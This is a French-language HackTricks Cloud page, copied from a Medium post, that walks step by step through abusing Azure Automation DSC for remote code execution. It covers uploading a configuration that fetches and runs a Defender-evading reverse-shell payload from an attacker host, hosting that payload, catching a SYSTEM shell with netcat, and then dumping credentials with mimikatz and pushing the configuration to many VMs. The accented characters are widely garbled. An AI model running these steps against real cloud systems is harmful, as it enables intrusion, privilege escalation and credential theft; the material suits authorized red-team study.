# Az - Configuration d'√©tat RCE

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Ce post a √©t√© copi√© de** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Pr√©paration de l'infrastructure du serveur distant (C2) <a href="#f0fa" id="f0fa"></a>

Je vais h√©berger une version all√©g√©e du payload Nishang Invoke-PowerShellTcp.ps1 depuis le serveur distant "40.84.7.74", qui est la machine Kali. Le nom du payload sera "RevPS.ps1". Pour √©viter que le script Nishang soit supprim√© par Windows Defender pour une raison quelconque (peut-√™tre pr√©f√©rez-vous d√©poser le fichier sur le disque), j'ai ici une version all√©g√©e que vous pouvez utiliser qui contournera Defender : [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1). Ce sera h√©berg√© par un simple serveur Python Simple Server sur la machine Kali.

### √âtape 1 ‚Äî Cr√©er des fichiers <a href="#89de" id="89de"></a>

Nous devrons cr√©er un autre fichier de configuration DSC. Un mod√®le peut √™tre t√©l√©charg√© ici : [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1). Ce fichier de configuration utilisera la m√™me fonction d'√©criture de fichier que nous avons pr√©c√©demment utilis√©e. Cette fois, le contenu comprend du code pour t√©l√©charger et ex√©cuter un payload depuis notre serveur distant. De plus, nous utilisons une fonction de t√¢che planifi√©e disponible √† partir du module _ComputerManagementDsc_. La fonction de t√¢che planifi√©e jouera un r√¥le cl√© dans l'ex√©cution et nous fournira des privil√®ges SYSTEM plus tard.

Nous t√©l√©chargerons √©galement un script qui sera utilis√© pour publier notre configuration sur la VM. Il se trouve ici : [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1).

Ces fichiers serviront de mod√®le. **Vous devrez remplir les noms de variables et les param√®tres avec ce que vous utilisez**. Cela inclut les noms de ressources, les chemins de fichiers et les noms de serveurs/payloads externes que vous utilisez. Veuillez vous r√©f√©rer aux commentaires dans le code.

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

### √âtape 2 ‚Äî Zipper le fichier de configuration <a href="#c2c2" id="c2c2"></a>

Avec nos deux fichiers cr√©√©s, nous zipperons le fichier **‚Äòreverse\_shell\_config.ps1‚Äô** afin de pouvoir l'envoyer au compte de stockage
```
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
### √âtape 3 ‚Äî D√©finir le contexte de stockage et t√©l√©verser <a href="#bed9" id="bed9"></a>

Nous allons √† nouveau configurer le contexte de notre compte de stockage, ce que j'ai d√©j√† fait. J'ai d√©j√† un conteneur nomm√© '**azure-pentest**', c'est donc l√† que je vais publier le mien :
```
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
### √âtape 4 ‚Äî Pr√©parer la machine Kali <a href="#20fb" id="20fb"></a>

Dans notre machine Kali, nous pouvons simplement utiliser _wget_ pour t√©l√©charger notre payload PowerShell. Le script de reverse-shell brut est situ√© ici : [https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1](https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1).
```
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
```markdown
<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

Nous devons modifier le script de reverse-shell en y ajoutant nos param√®tres, afin que la VM Windows sache o√π se connecter une fois qu'il est ex√©cut√©. Dans mon cas, j'ajoute ce qui suit :
```
```
RevPShell -Reverse 40.84.7.73 443
```
### √âtape 5 ‚Äî Publier le fichier de configuration <a href="#9ad6" id="9ad6"></a>

Nous allons maintenant ex√©cuter notre fichier de configuration. J'ai configur√© le mien pour qu'il soit publi√© sur le Bureau pour une meilleure visualisation, cependant, il peut √™tre publi√© presque partout. Apr√®s quelques minutes, nous verrons que le script de reverse-shell a √©t√© publi√© !

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### √âtape 6 ‚Äî H√©berger le Payload et Configurer l'√âcouteur <a href="#c55f" id="c55f"></a>

Une fois que nous avons publi√© la configuration, nous pouvons simultan√©ment d√©marrer un SimpleHTTPServer Python sur le port 80 pour h√©berger le payload, ainsi qu'un √©couteur netcat afin de capturer la connexion :
```
sudo python -m SimpleHTTPServer 80sudo nc -nlvp 443
```
Nous constatons que la t√¢che planifi√©e a √©t√© ex√©cut√©e et notre charge utile a √©t√© r√©cup√©r√©e et ex√©cut√©e en m√©moire avec des privil√®ges de niveau **SYSTEM** !

<figure><img src="../../../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

### Conclusion <a href="#1ec2" id="1ec2"></a>

Cela ouvre la porte √† de nombreuses possibilit√©s. Puisque nous avons un shell fonctionnant en tant que **SYSTEM,** nous pouvons extraire les identifiants avec mimikatz (potentiellement risqu√© selon la maturit√© de l'EDR pour les ressources cloud). Si vous extrayez des identifiants, il y a de fortes chances qu'ils puissent √™tre r√©utilis√©s ailleurs sur diff√©rentes ressources. Enfin, un point important √† retenir est que, au lieu de limiter cela √† une seule VM, vous avez maintenant la capacit√© de potentiellement appliquer cette configuration √† plusieurs VM.

Sur cette note, cela conclut nos aventures avec Azure Automation DSC ! J'esp√®re que vous vous √™tes amus√©s, que vous avez beaucoup appris et que vous continuerez √† vous d√©velopper avec votre propre cr√©ativit√©.

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
